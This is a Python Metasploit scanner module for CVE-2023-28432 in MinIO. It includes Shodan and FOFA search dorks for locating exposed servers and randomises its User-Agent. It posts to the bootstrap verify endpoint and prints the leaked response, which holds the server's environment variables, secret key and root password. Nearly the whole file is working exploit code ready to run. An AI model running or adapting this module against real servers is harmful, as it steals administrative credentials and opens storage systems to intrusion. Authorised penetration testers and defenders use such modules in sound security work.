#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import requests
    import urllib3
    import random
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'MinIO Information Disclosure Vulnerability',
    'description': '''
    an information disclosure vulnerability in Minio resulting in disclosure of all environment variables, MINIO_SECRET_KEY, and MINIO_ROOT_PASSWORD.
    dork: app="minio" (fofa)
          banner="MinIO" || header="MinIO" || title="MinIO Browser" (fofa)
          http.title:"MinIO Browser" (shodan)
    ''',
    'authors': ['Taroballz', 'ITRI-PTTeam'],
    'references': [
        {"type": "cve", "ref": "2023-28432"},
    ],
    'date': "2023-05-27",
    'license': 'MSF_LICENSE',
    "type": "single_scanner",
    "options": {
        'rport': {'type': 'int', 'description': 'port', 'required': True, 'default': 9000},
        'rssl': {'type': 'bool', 'description': 'Negotiate SSL for outgoing connections', 'required': True, 'default': 'false'}
    }
}


def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = f'Chrome/{first_num}.0.{third_num}.{fourth_num}'

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    host = args['rhost']
    if host[-1:] == '/':
        host = host[:-1]
    if args["rssl"] == "true":
        sURL = 'https://' + host + ":" + args["rport"]
    else:
        sURL = "http://" + host + ":" + args["rport"]

    module.log(f"Target URL: {sURL}")

    headers = {
        'User-Agent': get_ua(),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    vulnURL = sURL + "/minio/bootstrap/v1/verify"

    try:
        init_req = requests.get(sURL, headers=headers, verify=False, timeout=10)
        if init_req.status_code == 200:
            module.log(f"Target {sURL} seems to online")
            module.log(f"checking vulnerable or not")
        else:
            module.log(f"Target {sURL} seems to offline")
            return
        req = requests.post(vulnURL, headers=headers, verify=False, timeout=10, data={'key': 'value'})
        if req.status_code == 200:
            keyword = ['MinioEn', 'MinioPlatform', 'MINIO_SECRET_KEY', 'MINIO_ROOT_PASSWORD']
            for k in keyword:
                if k in req.text:
                    module.log(f"The target {sURL} seems to be vuln by CVE-2023-28432", "good")
                    module.log(f'{req.text}', "good")
                    return

        module.log('It seems not vulnerable', 'error')

    except Exception as e:
        module.log(str(e), 'error')


if __name__ == '__main__':
    module.run(metadata, run)
